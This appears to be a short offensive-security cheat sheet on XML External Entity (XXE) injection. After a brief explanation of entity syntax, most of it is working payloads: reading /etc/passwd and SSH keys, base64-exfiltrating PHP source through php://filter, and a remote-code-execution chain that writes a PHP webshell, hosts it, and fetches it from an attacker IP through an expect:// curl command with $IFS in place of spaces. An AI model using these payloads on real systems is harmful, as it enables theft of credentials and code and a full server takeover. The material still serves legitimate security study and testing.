XXE = XML External Entity
## Overview
On webpages, sometimes during a POST we can input information that utilizes XML
Example Form
```
<?xml version = "1.0"?>
	<order>
		<quantity>
	        4
		</quantity>
		<item>
			banana
		</item>
	</order>
```

We can abuse these forms using XXEs
General syntax
```
<!DOCTYPE var1 [
<!ENTITY var2 "some random text here">
]>
```

Example of XXE attack
```
<?xml version = "1.0"?>
	<!DOCTYPE foo [
	<!ENTITY example "get pwned xD">
	]>
	<order>
		<quantity>
	        4
		</quantity>
		<item>
			&example;
		</item>
	</order>
```
when we POST this, instead of printing "banana", it will print "get pwned xD"


## Payloads
NOTE: DO NOT FORGET TARGETS CAN ALSO BE WINDOWS

Reading Sensitive Files
```
<!DOCTYPE var1 [
<!ENTITY var2 SYSTEM 'file:///etc/passwd'>
]>
```
This is an example... consider ssh keys as well, just like you would an LFI

Reading Source Code
```
<!DOCTYPE var1 [
<!ENTITY var2 SYSTEM 'php://filter/convert.base64-encode/resource=<file>.php'>
]>
```

RCE
```
# Create webshell php file and host it
	echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
	python3 -m http.server 80

<!DOCTYPE var1 [
<!ENTITY var2 SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```